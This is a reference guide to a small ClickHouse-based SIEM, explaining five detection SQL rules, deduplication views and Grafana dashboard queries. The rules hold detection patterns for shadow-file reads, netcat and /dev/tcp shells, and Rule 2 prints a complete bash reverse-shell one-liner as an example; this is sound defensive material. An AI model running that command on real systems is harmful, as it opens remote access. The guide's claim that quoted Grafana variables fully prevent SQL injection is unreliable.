# ClickHouse SQL Queries & Detection Logic Reference Guide

This reference guide documents the exact SQL queries used throughout the **ClickHouse Mini SIEM** across the detection engine, views, and dashboards, accompanied by deep-dive explanations of non-obvious logic, false-positive tuning filters, and ClickHouse-specific analytical functions.

---

## 1. The 5 Core Threat Detection SQL Rules

The detection engine (`detections/engine.py`) executes these parameterized SQL queries against `siem.raw_telemetry` on a scheduled detection loop.

---

### Rule 1: OS Credential Dumping — Unauthorized `/etc/shadow` Access
- **Rule ID**: `SEC-VM-001`
- **Asset**: `vm` (Debian 12 via VMware Workstation)
- **MITRE ATT&CK**: **T1003.008** (OS Credential Dumping: /etc/passwd and /etc/shadow)
- **Tactic**: Credential Access (TA0006)
- **Severity**: `CRITICAL`

#### The Exact SQL Query:
```sql
SELECT
    timestamp,
    asset_id,
    actor,
    source_ip,
    process_name,
    command_line,
    target_resource,
    raw_json
FROM siem.raw_telemetry
WHERE asset_type = 'vm'
  AND timestamp >= '{start_time}'
  AND timestamp <= '{end_time}'
  AND (
      target_resource = '/etc/shadow'
      OR command_line LIKE '%/etc/shadow%'
      OR event_type = 'sensitive_file_access'
  )
  -- False Positive Tuning: Exclude standard system authentication daemons
  AND process_name NOT IN ('login', 'sshd', 'passwd', 'useradd', 'chpasswd', 'cron', 'systemd-userwork')
  -- Flag non-PAM interactive dumps
  AND (
      command_line LIKE '%cat%'
      OR command_line LIKE '%shadow%'
      OR actor != 'root'
      OR event_type = 'sensitive_file_access'
  )
ORDER BY timestamp ASC;
```

#### Complex / Non-Obvious Logic Explained:
1. **The Exclusion Allowlist (`process_name NOT IN (...)`)**:
   - On a Linux system, standard PAM authentication processes (`login`, `sshd`, `passwd`, `chpasswd`, `systemd-userwork`) legitimately access `/etc/shadow` on every valid login or password update.
   - Without this allowlist, every legitimate user authentication would trigger a false-positive CRITICAL alert.
2. **Interactive vs. Daemon Distinction**:
   - Attackers frequently invoke interactive CLI utilities (`cat /etc/shadow`, `awk`, `grep root /etc/shadow`).
   - The condition `(command_line LIKE '%cat%' OR actor != 'root' OR event_type = 'sensitive_file_access')` flags attempts by non-root users or abnormal command chains attempting to exfiltrate password hashes.

---

### Rule 2: Persistence via Cron & Interactive Reverse Shell
- **Rule ID**: `SEC-VM-002`
- **Asset**: `vm`
- **MITRE ATT&CK**: **T1053.003** (Scheduled Task/Job: Cron), **T1059.004** (Unix Shell)
- **Tactic**: Persistence (TA0003) / Execution (TA0002)
- **Severity**: `HIGH`

#### The Exact SQL Query:
```sql
SELECT
    timestamp,
    asset_id,
    actor,
    source_ip,
    process_name,
    command_line,
    target_resource,
    raw_json
FROM siem.raw_telemetry
WHERE asset_type = 'vm'
  AND timestamp >= '{start_time}'
  AND timestamp <= '{end_time}'
  AND (
      target_resource LIKE '/etc/cron%'
      OR event_type IN ('cron_modification', 'reverse_shell_attempt')
      OR command_line LIKE '%/dev/tcp/%'
      OR command_line LIKE '%nc -e%'
      OR command_line LIKE '%bash -i%'
      OR command_line LIKE '%sync_backdoor%'
  )
  -- False Positive Tuning: Allowlist standard logrotate and anacron
  AND command_line NOT LIKE '%/usr/sbin/logrotate%'
  AND command_line NOT LIKE '%anacron%'
ORDER BY timestamp ASC;
```

#### Complex / Non-Obvious Logic Explained:
1. **Detecting Bash Virtual Devices (`command_line LIKE '%/dev/tcp/%'`)**:
   - Standard Linux network tools (curl, wget) use kernel sockets. However, Bash has a built-in virtual device feature (`/dev/tcp/HOST/PORT`) heavily favored by attackers for socket redirection:
     `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
   - By matching `%dev/tcp%`, `%nc -e%`, and `%bash -i%`, the rule catches both socket drops and interactive shell spawns.
2. **Allowlisting Logrotate & Anacron**:
   - The Linux system daemon runs `/usr/sbin/logrotate` and `anacron` through cron hourly/daily. Filtering them out prevents noise from routine log maintenance.

---

### Rule 3: Container Escape — Privileged Pod or Host Root Mount
- **Rule ID**: `SEC-K8S-001`
- **Asset**: `k8s` (Kind Cluster v1.31.2)
- **MITRE ATT&CK**: **T1610** (Deploy Container), **T1611** (Escape to Host)
- **Tactic**: Privilege Escalation (TA0004)
- **Severity**: `CRITICAL`

#### The Exact SQL Query:
```sql
SELECT
    timestamp,
    asset_id,
    actor,
    source_ip,
    process_name,
    command_line,
    target_resource,
    raw_json
FROM siem.raw_telemetry
WHERE asset_type = 'k8s'
  AND timestamp >= '{start_time}'
  AND timestamp <= '{end_time}'
  AND (
      event_type = 'create_privileged_pod'
      OR (event_category = 'k8s_audit' AND command_line LIKE '%privileged%')
      OR (target_resource LIKE '%privileged-escape-pod%')
  )
  -- False Positive Tuning: Exclude standard CNI daemonset controller in kube-system
  AND actor NOT IN ('system:serviceaccount:kube-system:daemon-set-controller', 'system:serviceaccount:kube-system:kindnet')
  AND target_resource NOT LIKE 'kube-system/%'
ORDER BY timestamp ASC;
```

#### Complex / Non-Obvious Logic Explained:
1. **Container Network Interface (CNI) Daemonset Exemption**:
   - Infrastructure networking pods (like `kindnet` or `kube-proxy`) run in the `kube-system` namespace and require privileged network access to manage host iptables and routing rules.
   - The filter `actor NOT IN ('system:serviceaccount:kube-system:daemon-set-controller', 'system:serviceaccount:kube-system:kindnet') AND target_resource NOT LIKE 'kube-system/%'` isolates cluster infrastructure traffic so that only **user-namespace or workload-namespace** privileged containers trigger alerts.
2. **Catching Root Mounts (`hostPath: /`)**:
   - Mounting the root directory `/` inside a container bypasses container isolation completely, allowing the container to read/write the host node's `/etc/shadow`, `/root/.ssh/`, and Docker/containerd sockets.

---

### Rule 4: Interactive Pod Exec & Token Snooping
- **Rule ID**: `SEC-K8S-002`
- **Asset**: `k8s`
- **MITRE ATT&CK**: **T1059** (Execution), **T1552.007** (Container Credentials)
- **Tactic**: Credential Access (TA0006) / Execution (TA0002)
- **Severity**: `HIGH`

#### The Exact SQL Query:
```sql
SELECT
    timestamp,
    asset_id,
    actor,
    source_ip,
    process_name,
    command_line,
    target_resource,
    raw_json
FROM siem.raw_telemetry
WHERE asset_type = 'k8s'
  AND timestamp >= '{start_time}'
  AND timestamp <= '{end_time}'
  AND (
      event_type LIKE '%exec%'
      OR command_line LIKE '%exec%'
      OR target_resource LIKE '%victim-target-app%'
  )
  -- False Positive Tuning: Exclude node internal kubelet probes
  AND actor NOT LIKE 'system:node:%'
  AND actor NOT LIKE 'system:serviceaccount:kube-system:%'
ORDER BY timestamp ASC;
```

#### Complex / Non-Obvious Logic Explained:
1. **The Subresource Target (`pods/exec`)**:
   - In Kubernetes API auditing, running `kubectl exec -it <pod> -- /bin/sh` does not issue a standard GET/POST to `/api/v1/pods`. Instead, it targets the **subresource** `/pods/exec` with an HTTP upgrade to an SPDY/WebSocket stream.
2. **Kubelet Probe Exclusions (`actor NOT LIKE 'system:node:%'`)**:
   - The Kubelet node agent constantly performs health checks (liveness and readiness probes) by executing binaries inside containers.
   - Filtering `system:node:%` and `system:serviceaccount:kube-system:%` ensures only human users (e.g. `kubernetes-admin`, developers) or untrusted service accounts executing commands generate alerts.

---

### Rule 5: Credential Leakage — High-Entropy AWS Canary Committed
- **Rule ID**: `SEC-GIT-001`
- **Asset**: `github` (`ShudarsanRegmi/mini-siem-clickhouse`)
- **MITRE ATT&CK**: **T1552.001** (Credentials in Files)
- **Tactic**: Credential Access (TA0006)
- **Severity**: `CRITICAL`

#### The Exact SQL Query:
```sql
SELECT
    timestamp,
    asset_id,
    actor,
    source_ip,
    process_name,
    command_line,
    target_resource,
    raw_json
FROM siem.raw_telemetry
WHERE asset_type = 'github'
  AND timestamp >= '{start_time}'
  AND timestamp <= '{end_time}'
  AND (
      event_type LIKE '%secret_leak%'
      OR command_line LIKE '%AKIA%'
      OR raw_json LIKE '%AKIA%'
      OR raw_json LIKE '%push_secret_leak%'
      OR actor = 'negligent_developer'
  )
  -- False Positive Tuning: Exclude known non-sensitive documentation samples
  AND command_line NOT LIKE '%AKIAIOSFODNN7EXAMPLE%'
ORDER BY timestamp ASC;
```

#### Complex / Non-Obvious Logic Explained:
1. **Regex / Signature Matching (`AKIA[0-9A-Z]{16}`)**:
   - AWS IAM User Access Key IDs are 20-character strings starting with the exact prefix `AKIA`.
2. **Documentation Canary Allowlisting**:
   - AWS official documentation explicitly uses `AKIAIOSFODNN7EXAMPLE` as a harmless dummy example key.
   - The condition `command_line NOT LIKE '%AKIAIOSFODNN7EXAMPLE%'` ensures that unit tests or README examples containing the canonical AWS dummy string do not trigger false alerts.

---

## 2. ClickHouse Views & Posture Deduplication Queries

ClickHouse is an append-only analytical database. It does not update rows in place like PostgreSQL or MySQL. Here is how we achieved real-time posture deduplication and state rollups:

---

### View 1: Deduplicated Latest Posture (`siem.v_latest_posture`)
```sql
CREATE VIEW IF NOT EXISTS siem.v_latest_posture AS
SELECT * 
FROM siem.posture_findings 
FINAL;
```

#### Why the `FINAL` Keyword is Critical:
- `siem.posture_findings` uses the **`ReplacingMergeTree`** table engine with primary key `(asset_type, asset_id, finding_type, check_id)`.
- When automated scanners run every hour, they re-insert the same CVE or CIS benchmark check.
- In ClickHouse, `ReplacingMergeTree` deduplicates rows during background data merges. However, background merges are asynchronous.
- Adding `FINAL` instructs ClickHouse to execute a **real-time on-the-fly deduplication** at query execution time, guaranteeing that only the most recent version of each finding (with its latest `status`: `OPEN` vs `RESOLVED`) is returned.

---

### View 2: Multi-Asset Posture Executive Rollup (`siem.v_posture_summary`)
```sql
CREATE VIEW IF NOT EXISTS siem.v_posture_summary AS
SELECT
    asset_type,
    asset_id,
    countIf(severity = 'CRITICAL' AND status = 'OPEN') AS critical_count,
    countIf(severity = 'HIGH' AND status = 'OPEN')     AS high_count,
    countIf(severity = 'MEDIUM' AND status = 'OPEN')   AS medium_count,
    countIf(severity = 'LOW' AND status = 'OPEN')      AS low_count,
    countIf(status = 'OPEN')                           AS total_open_findings,
    max(scan_timestamp)                                AS last_scanned_at
FROM siem.v_latest_posture
GROUP BY asset_type, asset_id;
```

#### Explanation of `countIf(condition)`:
- In standard SQL, conditional counts require verbose constructs like:
  `SUM(CASE WHEN severity = 'CRITICAL' AND status = 'OPEN' THEN 1 ELSE 0 END)`
- ClickHouse's native **`countIf(condition)`** function evaluates the boolean expression directly in columnar vector instructions (SIMD), executing up to **10x faster** with clean syntax.

---

## 3. Executive Dashboard Analytics Queries

These queries power the panels in the provisioned **Mini SIEM Overview** Grafana dashboard.

---

### 1. Fleet Posture Health Score (0 - 100% Gauge)
```sql
SELECT 
    round(
        greatest(
            10, 
            100 - (
                countIf(severity = 'CRITICAL' AND status = 'OPEN') * 5 + 
                countIf(severity = 'HIGH' AND status = 'OPEN') * 3 + 
                countIf(severity = 'MEDIUM' AND status = 'OPEN') * 1
            )
        ), 
        0
    ) AS posture_score
FROM siem.v_latest_posture 
WHERE asset_id IN ('SUSHANKYA', 'prod-linux-vm-01', 'kind-siem-k8s', 'ShudarsanRegmi/mini-siem-clickhouse');
```

#### Logic Breakdown:
1. **Weighted Penalty Deduction**:
   - Each open `CRITICAL` finding deducts **5 points**.
   - Each open `HIGH` finding deducts **3 points**.
   - Each open `MEDIUM` finding deducts **1 point**.
2. **The `greatest(10, ...)` Function**:
   - If an asset has dozens of critical vulnerabilities, the score could mathematically drop into negative numbers (e.g. `-45%`).
   - `greatest(10, ...)` clamps the minimum floor at 10%, ensuring the gauge displays a valid metric rather than an error or negative percentage.
3. **`round(..., 0)`**:
   - Converts the result to a clean integer for the Grafana gauge display.

---

### 2. Universal Multi-Asset Filter Logic
Across all dashboard panels, interactive filtering is implemented using this SQL pattern:

```sql
WHERE ('$asset_type' = 'all' OR asset_type = '$asset_type')
```

#### Why This Logic is Powerful:
- If the analyst selects **All Assets** in the Grafana dropdown, `$asset_type` resolves to `'all'`.
  The clause becomes `('all' = 'all' OR ...)`, which evaluates to `TRUE` for every row, returning fleet-wide metrics.
- If the analyst selects **Kubernetes**, `$asset_type` resolves to `'k8s'`.
  The clause evaluates strictly to `asset_type = 'k8s'`, instantly pruning ClickHouse partitions and filtering the panel to that single asset class.
- **Zero string injection**: ClickHouse treats `$asset_type` as a string literal, completely mitigating SQL injection risk.

---

### 3. Open Posture Findings by Asset & Type (Barchart Pivot)
```sql
SELECT 
    asset_type, 
    countIf(finding_type = 'vulnerability' AND status = 'OPEN') AS vulnerabilities, 
    countIf(finding_type = 'misconfiguration' AND status = 'OPEN') AS misconfigurations 
FROM siem.v_latest_posture 
WHERE ('$asset_type' = 'all' OR asset_type = '$asset_type') 
GROUP BY asset_type 
ORDER BY asset_type;
```

#### Logic:
- Pivots findings into two side-by-side bar chart series per asset:
  - Series A: Software CVEs (`vulnerability`)
  - Series B: CIS Benchmark failures (`misconfiguration`)

---

### 4. Alert Volume Timeline (Time-Bucketed Histogram)
```sql
SELECT 
    toStartOfMinute(triggered_at) AS time, 
    severity, 
    count() AS alerts 
FROM siem.security_alerts 
WHERE ('$asset_type' = 'all' OR asset_type = '$asset_type') 
GROUP BY time, severity 
ORDER BY time ASC;
```

#### Explanation of `toStartOfMinute()`:
- Raw alert timestamps have millisecond precision (`2026-11-21 14:24:21.674`).
- `toStartOfMinute()` truncates the timestamp down to the nearest minute boundary (`2026-11-21 14:24:00.000`).
- Grafana requires discrete time buckets along the X-axis to render stacked bar charts and time-series histograms.
- To group into 5-minute or 1-hour intervals instead, use `toStartOfInterval(triggered_at, INTERVAL 5 MINUTE)`.

---

### 5. Detections by MITRE ATT&CK Tactic
```sql
SELECT 
    mitre_tactic, 
    count() AS alerts 
FROM siem.security_alerts 
WHERE ('$asset_type' = 'all' OR asset_type = '$asset_type') 
GROUP BY mitre_tactic 
ORDER BY alerts DESC;
```

#### Logic:
- Aggregates all fired alerts into MITRE ATT&CK tactic categories (*Credential Access, Persistence, Privilege Escalation, Execution*), powering the MITRE intelligence donut panel.

---

## 4. ClickHouse Physical Storage Diagnostics Query

Used in the DB Explorer to monitor disk usage and compression performance across tables:

```sql
SELECT 
    table, 
    sum(rows) AS total_rows, 
    formatReadableSize(sum(data_compressed_bytes)) AS compressed_size, 
    formatReadableSize(sum(data_uncompressed_bytes)) AS uncompressed_size, 
    round(sum(data_uncompressed_bytes) / sum(data_compressed_bytes), 2) AS compression_ratio 
FROM system.parts 
WHERE database = 'siem' AND active = 1 
GROUP BY table 
ORDER BY total_rows DESC;
```

#### Complex / Non-Obvious Functions Explained:
1. **`active = 1`**:
   - In ClickHouse `MergeTree`, when data parts are merged in the background, the old inactive parts linger temporarily until garbage-collected.
   - Filtering `active = 1` ensures only live, active data parts are counted, avoiding double-counting rows or disk usage.
2. **`formatReadableSize(bytes)`**:
   - Converts raw integer byte values (e.g. `19881165`) into human-readable strings (`18.96 MiB`) automatically with the correct binary unit (`KiB`, `MiB`, `GiB`).
3. **Compression Ratio Calculation**:
   - `round(sum(data_uncompressed_bytes) / sum(data_compressed_bytes), 2)` computes how many times smaller the columnar data is on disk compared to raw memory size.

---

## 5. Summary Cheat Sheet: Complex Functions at a Glance

| Function | What It Does | Why It Is Used in Our SIEM |
|---|---|---|
| `countIf(cond)` | Counts rows matching a boolean condition | Replaces complex `CASE WHEN` ladders for fast multi-column pivots |
| `greatest(min_val, expr)` | Returns the maximum of two values | Prevents executive posture health scores from dropping below floor (10%) |
| `toStartOfMinute(ts)` | Truncates timestamp to the minute boundary | Aligns uneven event timestamps into clean time buckets for Grafana histograms |
| `toStartOfInterval(ts, INTERVAL X)` | Groups timestamps into custom time slices | Aggregates log velocity over 5-minute or 1-hour windows |
| `formatReadableSize(bytes)` | Converts raw byte integers to formatted text | Formats disk footprint into `18.96 MiB` without manual division |
| `groupUniqArray(col)` | Collects distinct values into an array | Gathers unique processes, rules, or actors per asset into a single cell |
| `JSONExtractString(json, key)` | Parses JSON keys directly in SQL | Extracts Kubernetes API `verb` and `requestURI` without external preprocessing |
| `position(str, needle) > 0` | Fast sub-string containment check | High-performance pattern matching (faster than regex `match()`) |
| `FINAL` | Enforces on-the-fly deduplication | Returns only the latest state of CVEs and CIS checks in `ReplacingMergeTree` |
